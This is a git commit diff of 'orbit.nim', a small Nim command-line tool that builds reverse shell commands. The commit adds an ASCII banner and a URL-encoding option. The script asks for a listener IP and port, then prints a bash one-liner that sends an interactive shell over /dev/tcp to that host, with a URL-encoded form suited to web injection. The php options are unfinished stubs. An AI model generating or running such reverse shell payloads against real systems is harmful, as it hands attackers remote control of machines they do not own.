ca9f810217f029039b6433e96f2c1dfc13b77fe6
Mkadd <likwton783@gmail.com>
2025-02-20 23:50:30 -0300

    Update orbit.nim
    aesthetics :paintbrush:

--- orbit.nim
+++ orbit.nim
@@ -1,36 +1,47 @@
-# 25/02/17
+# 25/02/18
 
 echo """
-    Welcome to revshell to shell 
-    v0.1 = beta version
+██████╗░███████╗██╗░░░██╗  ░█████╗░██████╗░██████╗░██╗████████╗
+██╔══██╗██╔════╝██║░░░██║  ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝
+██████╔╝█████╗░░╚██╗░██╔╝  ██║░░██║██████╔╝██████╦╝██║░░░██║░░░
+██╔══██╗██╔══╝░░░╚████╔╝░  ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░
+██║░░██║███████╗░░╚██╔╝░░  ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░
+╚═╝░░╚═╝╚══════╝░░░╚═╝░░░  ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░░
+
+Welcome to revshell to shell 
+v0.1 = beta version
 """
 
-echo "choose bash/interactive.php/php"
+echo "choose -- bash/interactive.php/php"
+
 
 var 
-    ip_addr: string
-    port: string
-    opt_on: string = readLine(stdin)
-    opt_tw: string
-    encode: string
-    tipe: string
+    opt_on: string = readLine(stdin) # principal option
+    # tipe: string | listar  
+    ip_addr, port: string
 
-while true:
-    
-    case opt_on:
+
+while true: 
+    case opt_on
         of "bash":
-            echo "hosted ip:"
-            ip_addr = readLine(stdin)
-            echo "hosted port"
-            port = readLine(stdin)
-            echo "rev generated: bash -c 'bash -i >& /dev/tcp/"&ip_addr&"/"&port&" 0>&1' "
-            break
+            echo "url encode? -- Yes/No"
+            let urle: string = readLine(stdin)
+            if urle == "Yes":
+                (echo "hosted ip:"; ip_addr = readLine(stdin)); (echo "hosted port:"; port = readLine(stdin))
+                echo "copy rev generated: bash -c 'bash -i >%26 /dev/tcp/"&ip_addr&"/"&port&" 0>%261' "
+                break
+            elif urle == "No":
+                echo "hosted ip:"
+                ip_addr = readLine(stdin)
+                echo "hosted port"
+                port = readLine(stdin)
+                 
         of "php":
             echo "Working..."
+            # echo intera
         of "interactive.php":
             echo "Working..."
         else:
             echo "Not working..."
             break
 
-# 15m coding
